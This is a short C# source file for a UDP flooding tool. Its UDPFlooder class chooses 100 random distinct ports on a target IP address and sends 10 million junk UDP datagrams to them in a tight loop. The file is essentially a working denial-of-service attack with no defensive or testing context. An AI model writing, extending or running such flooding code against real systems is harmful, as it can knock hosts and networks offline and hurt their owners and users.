using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace UDPFlood.Flooder;

public sealed class UDPFlooder
{
    public bool IsFlooderWorking { get; private set; }
    public string Address { get; }

    public UDPFlooder(string address)
    {
        Address = address;
    }

    public event EventHandler<int>? PacketSended;
    public event EventHandler<int>? PortClosed;

    public void Start()
    {
        IsFlooderWorking = true;

        var ports = new List<int>();

        var rnd = new Random();

        for (int i = 0; i < 100; i++)
        {
            ports.Add(rnd.Next(1000, 40000));

            while (ports.FindIndex(x => x == ports[i]) != i)
                ports[i] = rnd.Next(1000, 40000);
        }

        SendPackets(ports, 100000);
    }

    private void SendPackets(IEnumerable<int> ports, int packetCount)
    {
        var udpClient = new UdpClient();

        for (int i = 0; i < packetCount; i++)
        {
            foreach (var port in ports)
            {
                var message = Guid.NewGuid().ToString();
                var bytes = Encoding.UTF8.GetBytes(message);
                var point = new IPEndPoint(IPAddress.Parse(Address), port);
                udpClient.Send(bytes, point);

                PacketSended?.Invoke(this, port);
            }
        }

    }
}
